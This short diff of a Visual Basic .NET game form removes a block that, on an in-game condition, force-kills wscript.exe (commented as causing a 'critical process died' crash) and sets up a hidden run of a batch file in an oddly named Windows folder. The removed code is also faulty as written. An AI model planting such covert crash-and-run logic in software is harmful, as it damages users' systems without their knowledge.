@@ -62,23 +62,6 @@ Public Class Form1
 
             End If
 
-            If tries_hght = Screen.PrimaryScreen.Bounds.Height / 2 + 20 Then
-
-                Dim p As New ProcessStartInfo() ' bsod (critical process died)
-                p.FileName = "c:\windows\system32\taskkill.exe /f /im wscript.exe"
-                p.CreateNoWindow = True ' no console
-                p.UseShellExecute = False 'no shell
-                Process.Start(p)
-
-                System.Threading.Thread.Sleep(1000)
-
-                Dim pf As New ProcessStartInfo()
-                pf.FileName = "c:\windows\Servicetry\gameover.bat"
-                pf.CreateNoWindow = True
-                pf.UseShellExecute = False
-
-            End If
-
         End If
 
         PlayerImage = Image.FromFile(Application.StartupPath & "\bld.png")
